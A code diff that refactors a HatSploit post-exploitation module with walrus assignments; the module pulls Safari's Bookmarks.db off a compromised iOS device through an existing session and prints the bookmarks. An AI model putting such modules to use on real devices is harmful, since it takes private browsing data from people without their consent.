@@ -44,8 +44,7 @@ class HatSploitModule(Module, Sessions, DB):
         session, path = self.parse_options(self.options)
         bookmarks = '/private/var/mobile/Library/Safari/Bookmarks.db'
 
-        path = self.session_download(session, bookmarks, path)
-        if path:
+        if path := self.session_download(session, bookmarks, path):
             self.print_process("Parsing bookmarks database...")
 
             try:
@@ -54,11 +53,9 @@ class HatSploitModule(Module, Sessions, DB):
                 self.print_error("Failed to parse bookmarks database!")
                 return
 
-            bookmarks_data = []
-            for item in bookmarks:
-                bookmarks_data.append((item['title'], item['url']))
-
-            if bookmarks_data:
+            if bookmarks_data := [
+                (item['title'], item['url']) for item in bookmarks
+            ]:
                 self.print_table("Bookmarks", ('Title', 'URL'), *bookmarks_data)
             else:
                 self.print_warning("No bookmarks available on device.")
